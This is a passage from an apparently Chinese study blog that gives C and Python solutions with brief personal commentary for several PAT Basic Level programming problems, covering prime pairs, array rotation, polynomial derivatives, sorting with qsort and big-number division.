class="string">'P'</span>)</span><br><span class="line">p++, flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i] == <span class="string">'T'</span>)</span><br><span class="line">t++, flag = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">other++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(t == <span class="number">1</span> &amp;&amp; p == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!other &amp;&amp; z &amp;&amp; q*z == h &amp;&amp; p == <span class="number">1</span> &amp;&amp; t == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">101</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">getchar(); </span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line">gets(a);</span><br><span class="line"><span class="keyword">if</span>(judge(a))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"YES\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NO\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1007-素数对猜想"><a href="#1007-素数对猜想" class="headerlink" title="1007 素数对猜想"></a>1007 素数对猜想</h3><p>主要记录一下素数的优化技巧，这个题只是用普通的方法判断会在最后一个测试点超时。</p><ol><li><strong>偶数除2之外都不是素数，所以在判断那些是素数时，可以把2单独处理，其他的每次加2，只看奇数。</strong></li><li><strong>在素数判断时，先对所要判断的数开平方，时间复杂度大大降低。</strong></li></ol><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200622084350397.png" alt="image-20200622084350397"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prime_number</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, temp = (<span class="keyword">int</span>)<span class="built_in">sqrt</span>((<span class="keyword">double</span>)a); <span class="comment">//先开方</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">2</span>; i &lt;= temp; i++)</span><br><span class="line"><span class="keyword">if</span>(a%i == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, N = <span class="number">0</span>, count = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">temp = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">3</span>; i &lt;= N; i += <span class="number">2</span>)<span class="comment">//只看奇数</span></span><br><span class="line"><span class="keyword">if</span>(prime_number(i))</span><br><span class="line">count += i-temp == <span class="number">2</span> ? <span class="number">1</span>:<span class="number">0</span>, temp = i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1008-数组元素循环右移问题"><a href="#1008-数组元素循环右移问题" class="headerlink" title="1008 数组元素循环右移问题"></a>1008 数组元素循环右移问题</h3><p>本以为秒答的题，有个测试点，卡半天。我发现写程序什么错误都会犯。。</p><p>这里还是先总结一下，关于数组循环移动输出的问题：假设数组：a，长度：len</p><ol><li>循环左移n位：<code>a[n+i%len]</code></li><li>循环右移n位：与左移原理一样，只不起始点用总长度减一下：<code>a[(len-(n%len)+i)%n]</code></li></ol><p>题目：</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200623122843536.png" alt="image-20200623122843536"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, a[<span class="number">200</span>] = &#123;<span class="number">0</span>&#125;, span = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;span);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, a[(n-span%n)%n]);  <span class="comment">//这里开始一直忘记最后面的 %n ...</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>, a[(n-span%n+i)%n]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：我都不知道我怎么找这么一个错误的。</p><h3 id="1010-一元多项式求导"><a href="#1010-一元多项式求导" class="headerlink" title="1010 一元多项式求导"></a>1010 一元多项式求导</h3><p>题目感觉简单，但是好坑。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200626101205673.png" alt="image-20200626101205673"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> pre = <span class="number">0</span>, cur = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;pre, &amp;cur);</span><br><span class="line"><span class="keyword">if</span>(!cur)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0 0"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d"</span>, pre*cur, cur<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;pre, &amp;cur) != EOF) <span class="comment">//!!!，这里很重要。</span></span><br><span class="line"><span class="keyword">if</span>(cur)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d %d"</span>, pre*cur, cur<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：对输入的如何限定停止。</p><h3 id="1014-福尔摩斯的约会"><a href="#1014-福尔摩斯的约会" class="headerlink" title="1014 福尔摩斯的约会"></a>1014 福尔摩斯的约会</h3><p>感觉题目很多都不说明，自己在哪里猜有没有限制条件，结果都有。。。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200706184943170.png" alt="image-20200706184943170"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">4</span>][<span class="number">61</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>, j = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *day[<span class="number">8</span>] = &#123;<span class="string">" "</span>, <span class="string">"MON"</span>, <span class="string">"TUE"</span>, <span class="string">"WED"</span>, <span class="string">"THU"</span>, <span class="string">"FRI"</span>, <span class="string">"SAT"</span>, <span class="string">"SUN"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">4</span>)</span><br><span class="line">gets(s[i]), i++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; s[i][j] &amp;&amp; s[i+<span class="number">1</span>][j]; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span> &amp;&amp; s[i][j] == s[i+<span class="number">1</span>][j])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(count == <span class="number">0</span> &amp;&amp; s[i][j] &gt;= <span class="number">65</span> &amp;&amp; s[i][j] &lt;= <span class="number">71</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, day[s[i][j]<span class="number">-64</span>]);</span><br><span class="line">count++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(count == <span class="number">1</span> &amp;&amp; (s[i][j] &gt;= <span class="string">'A'</span> &amp;&amp; s[i][j] &lt;= <span class="string">'N'</span> || s[i][j] &gt;= <span class="number">48</span> &amp;&amp; s[i][j] &lt;= <span class="number">57</span>)) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02d:"</span>, s[i][j] &gt;= <span class="number">48</span> &amp;&amp; s[i][j] &lt;= <span class="number">57</span> ? s[i][j]<span class="number">-48</span> : s[i][j]<span class="number">-55</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(i &gt; <span class="number">1</span> &amp;&amp; s[i][j] == s[i+<span class="number">1</span>][j] &amp;&amp; (s[i][j] &gt;= <span class="number">65</span> &amp;&amp; s[i][j] &lt;= <span class="number">90</span> || s[i][j] &gt;= <span class="number">97</span> &amp;&amp; s[i][j] &lt;= <span class="number">122</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02d\n"</span>, j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中有个平时没注意过的地方，<code>i &gt; 1 &amp;&amp; s[i][j] == s[i+1][j] &amp;&amp; (s[i][j] &gt;= 65 &amp;&amp; s[i][j] &lt;= 90 || s[i][j] &gt;= 97 &amp;&amp; s[i][j] &lt;= 122))</code>，对于这判断式，后面有 || 就一定要加上括号，不然它满足了，判断式就直接成立了。。。</p><p>总结：注意题目隐含条件。</p><h3 id="1015-德才论"><a href="#1015-德才论" class="headerlink" title="1015 德才论"></a>1015 德才论</h3><p>这道题自己开始做起来还是挺难的，先分类后冒泡排序，但一般会有测试点超过，果然。后面尝试使用C语言的qsort()，成功了，从这道题，对qsort()使用变得深入很多。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200702165310493.png" alt="image-20200702165310493"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line"><span class="keyword">int</span> c; </span><br><span class="line">&#125;Stu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> low = <span class="number">0</span>, high = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">const</span> Stu *a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a-&gt;d &gt;= high &amp;&amp; a-&gt;c &gt;= high)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a-&gt;d &gt;= high &amp;&amp; a-&gt;c &gt;= low)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a-&gt;d &gt;= low &amp;&amp; a-&gt;c &gt;= low &amp;&amp; a-&gt;d &gt;= a-&gt;c)</span><br><span class="line"><span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a-&gt;d &gt;= low &amp;&amp; a-&gt;c &gt;= low)</span><br><span class="line"><span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Stu *a1 = (Stu *)a, *b1 = (Stu *)b;</span><br><span class="line"><span class="keyword">int</span> sum = a1-&gt;c+a1-&gt;d, sum1 = b1-&gt;c+b1-&gt;d;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(check(a1) == check(b1))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(sum == sum1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b1-&gt;d == a1-&gt;d)</span><br><span class="line"><span class="keyword">return</span> a1-&gt;id - b1-&gt;id;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> b1-&gt;d - a1-&gt;d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> sum1-sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> check(a1)-check(b1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, count = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;n, &amp;low, &amp;high);</span><br><span class="line">Stu *stu = (Stu *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Stu)*n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;stu[i].id, &amp;stu[i].d, &amp;stu[i].c);</span><br><span class="line">count += stu[i].d &gt;= low &amp;&amp; stu[i].c &gt;= low ? <span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">qsort(stu, n, <span class="keyword">sizeof</span>(Stu), cmp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, count);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>, stu[i].id, stu[i].d, stu[i].c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：这道题主要二点，一：想到先划分类，二：如何使用上qsort()函数。</strong></p><h3 id="1017-A除以B"><a href="#1017-A除以B" class="headerlink" title="1017 A除以B"></a>1017 A除以B</h3><p>这个题使用C语言来写就是一个大数除法，使用平常手算除法的思想，从开始除到最后。但是这个题使用python来做的话就只是函数的调用。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200703085203557.png" alt="image-20200703085203557"></p><p><strong>C语言：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1001</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, temp = <span class="number">0</span>, ans = <span class="number">0</span>, len = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d"</span>, s, &amp;n);</span><br><span class="line">len = <span class="built_in">strlen</span>(s);</span><br><span class="line">ans = (s[<span class="number">0</span>]<span class="number">-48</span>)/n;</span><br><span class="line"><span class="keyword">if</span>(len == <span class="number">1</span> || ans)  <span class="comment">//处理数据是0的情况。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, ans);</span><br><span class="line"></span><br><span class="line">temp = (s[<span class="number">0</span>]<span class="number">-48</span>)%n;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans = (temp*<span class="number">10</span>+s[i]<span class="number">-48</span>)/n;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, ans);</span><br><span class="line">temp = (temp*<span class="number">10</span>+s[i]<span class="number">-48</span>)%n; <span class="comment">//每次除后就往后推进。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>, temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>python:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = input().split()</span><br><span class="line">q, r = divmod(int(n[<span class="number">0</span>]), int(n[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">print</span> (str(q)+<span class="string">' '</span>+str(r))</span><br></pre></td></tr></table></figure><p><strong>总结：对大数除法使用手算除法的第一次简单应用。</strong></p><h3 id="1018-锤子剪刀布"><a href="#1018-锤子剪刀布" class="headerlink" title="1018 锤子剪刀布"></a>1018 锤子剪刀布</h3><p>我发现只要题目写起来比自己预想的代码量大，我就会焦躁，感觉题目不会有那么麻烦，想哪里写的罗嗦了 ，怎么这个都不会之类。导致最后就是更不想做题了。这个题就是个例子，开始预想的很简单，代码也少，但这个题确实判断有点繁琐，尽管有简单的写法，也在自己能力之外吧。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200704154740020.png" alt="image-20200704154740020"></p><p>麻烦的地方就是图中标注的地方。自己用的好像是一个类似哈希表的东西，因为没学过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>, <span class="built_in">max</span> = <span class="number">0</span>, max1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ch1 = <span class="number">0</span>, ch2 = <span class="number">0</span>, s[<span class="number">4</span>] = &#123;<span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'J'</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>, c = <span class="number">0</span>, <span class="built_in">map</span>[<span class="number">127</span>] = &#123;<span class="number">0</span>&#125;, map1[<span class="number">127</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">while</span>(i++ &lt; n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%c %c"</span>, &amp;ch1, &amp;ch2);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">if</span>(ch1 == <span class="string">'C'</span> &amp;&amp; ch2 == <span class="string">'J'</span>)</span><br><span class="line">a++, <span class="built_in">map</span>[<span class="string">'C'</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ch1 == <span class="string">'C'</span> &amp;&amp; ch2 == <span class="string">'B'</span>)</span><br><span class="line">c++, map1[<span class="string">'B'</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ch1 == <span class="string">'B'</span> &amp;&amp; ch2 == <span class="string">'J'</span>)</span><br><span class="line">c++, map1[<span class="string">'J'</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ch1 == <span class="string">'B'</span> &amp;&amp; ch2 == <span class="string">'C'</span>)</span><br><span class="line">a++, <span class="built_in">map</span>[<span class="string">'B'</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ch1 == <span class="string">'J'</span> &amp;&amp; ch2 == <span class="string">'B'</span>)</span><br><span class="line">a++, <span class="built_in">map</span>[<span class="string">'J'</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span 